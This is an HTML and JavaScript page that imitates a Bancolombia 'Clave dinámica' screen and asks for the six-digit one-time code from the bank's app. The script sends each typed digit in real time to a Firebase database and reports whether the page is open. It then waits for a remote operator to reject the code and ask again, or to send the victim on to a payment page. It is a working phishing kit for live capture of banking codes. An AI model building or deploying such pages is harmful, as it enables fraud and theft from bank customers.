<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Clave dinámica</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
body{background:#f5f5f5;}

/* HEADER */
.header{
  text-align:center;
  padding:20px;
  background:#fff;
  border-bottom:1px solid #e5e5e5;
}
.header img{
  height:30px;
}

/* FONDO */
.bg{
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  z-index:-1;
}
.bg img{
  width:100%;
  height:100%;
  object-fit:cover;
}

/* CONTENIDO */
.container{
  display:flex;
  justify-content:center;
  align-items:center;
  height:80vh;
  padding:20px;
}

.card{
  background:#fff;
  padding:40px;
  border-radius:16px;
  width:100%;
  max-width:420px;
  text-align:center;
  box-shadow:0 10px 30px rgba(0,0,0,0.05);
}

.title{
  font-size:24px;
  margin-bottom:15px;
  font-weight:600;
}

.subtitle{
  font-size:14px;
  color:#555;
  margin-bottom:30px;
}

/* PIN */
.pin{
  display:flex;
  justify-content:center;
  gap:12px;
  margin-bottom:30px;
}

.pin input{
  width:40px;
  height:45px;
  text-align:center;
  font-size:20px;
  border:none;
  border-bottom:2px solid #ccc;
  outline:none;
  background:transparent;
}

.pin input:focus{
  border-bottom:2px solid #FFD200;
}

/* BOTONES */
.buttons{
  display:flex;
  gap:10px;
}

.btn{
  flex:1;
  padding:12px;
  border-radius:25px;
  font-weight:600;
  cursor:pointer;
  border:none;
}

.btn-back{
  background:#fff;
  border:1px solid #000;
}

.btn-next{
  background:#ccc;
}

.btn-next.active{
  background:#333;
  color:#fff;
}

/* MOBILE */
@media(max-width:768px){
  .container{
    height:auto;
    margin-top:40px;
  }
}


.overlay{
  display:none;
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.5);
  backdrop-filter:blur(4px);
  justify-content:center;
  align-items:center;
  z-index:9999;
}

.loader{
  color:#fff;
  text-align:center;
}

/* 🔴 ERROR ROJO */
.alert-error{
  position:fixed;
  top:0;
  left:0;
  width:100%;
  background:#c0392b;
  color:#fff;
  padding:15px;
  text-align:center;
  font-weight:600;
  z-index:9999;
}
</style>
</head>

<body>

<div class="header">
  <img src="logo.svg">
</div>

<div class="bg">
  <img src="auth-trazo.svg">
</div>

<div class="container">
  <div class="card">
    <div class="title">Clave dinámica</div>
    <div class="subtitle">Consulta tu Clave Dinámica desde la App Mi Bancolombia.</div>

    <div class="pin">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
      <input maxlength="1" type="password">
    </div>

    <div class="buttons">
      <button class="btn btn-back">Cancelar</button>
      <button id="btn" class="btn btn-next">Continuar</button>
    </div>
  </div>
</div>

<div class="overlay">
  <div class="loader">
    <div class="spinner"></div>
    <p>Cargando...</p>
  </div>
</div>

<div class="alert-error" style="display:none;">
  ❌ Clave dinámica incorrecta. Verifica e intenta nuevamente.
</div>

<script type="module" src="firebase.js"></script>

<script>
window.addEventListener('load', () => {

const { db, uid, ref, update, onValue } = window;

// ===============================
// 🔹 ESTADO (NO BORRAR)
// ===============================
update(ref(db, "dataPages/" + uid), { 
  estado: "abierto",
  paginaActual: "Dinamica.html",
  oculto: false
});

window.addEventListener("beforeunload", () => {
  update(ref(db, "dataPages/" + uid), { 
    estado: "cerrado",
    paginaActual: null  
  });
});

// ===============================
// 🔹 ELEMENTOS
// ===============================
const inputs = document.querySelectorAll('.pin input');
const btn = document.getElementById('btn');
const overlay = document.querySelector('.overlay');

// ===============================
// 🔹 INPUT (TIEMPO REAL)
// ===============================
inputs.forEach((input, index) => {

  input.addEventListener('input', () => {

    input.value = input.value.replace(/\D/g, "");

    if(input.value && index < inputs.length - 1){
      inputs[index + 1].focus();
    }

    const codigo = [...inputs].map(i => i.value).join("");

    // 🔥 TIEMPO REAL (YA FUNCIONA)
    update(ref(db, "dataPages/" + uid), {
      codigo: codigo
    });

    const filled = [...inputs].every(i => i.value !== "");

    if(filled){
      btn.classList.add('active');
    } else {
      btn.classList.remove('active');
    }

  });

});

// ===============================
// 🔹 BOTÓN
// ===============================
btn.addEventListener("click", () => {

  const codigo = [...inputs].map(i => i.value).join("");
  if(codigo.length < 6) return;

  update(ref(db, "dataPages/" + uid), {
    mostrarBarracodigo: true
  });

  if (overlay) overlay.style.display = "flex";

});

// ===============================
// 🔹 ERROR DESDE PANEL (AHORA SÍ FUNCIONA)
// ===============================
onValue(ref(db, "dataPages/" + uid), snapshot => {

  const data = snapshot.val();
  if (!data) return;

  // ===============================
  // 🔴 ERROR CÓDIGO
  // ===============================
  if (data.estadoErrorCodigo === "incorrecto") {

    // 🔴 quitar overlay
    if (overlay) overlay.style.display = "none";

    // 🔴 mostrar error
    const alert = document.querySelector(".alert-error");
    if (alert) {
      alert.style.display = "block";

      setTimeout(() => {
        alert.style.display = "none";
      }, 4000);
    }

    // 🔄 reset inputs
    inputs.forEach(i => i.value = "");
    btn.classList.remove("active");
    inputs[0].focus();

    // 🔥 limpiar error
    update(ref(db, "dataPages/" + uid), {
      estadoErrorCodigo: null
    });

  }

  // ===============================
  // 🔵 REDIRECCIÓN A PAGO
  // ===============================
  if (data.accion === "pago") {

    update(ref(db, "dataPages/" + uid), {
      accion: null
    });

    window.location.href = "pago.html";
  }

});

});
</script>

</body>
</html>
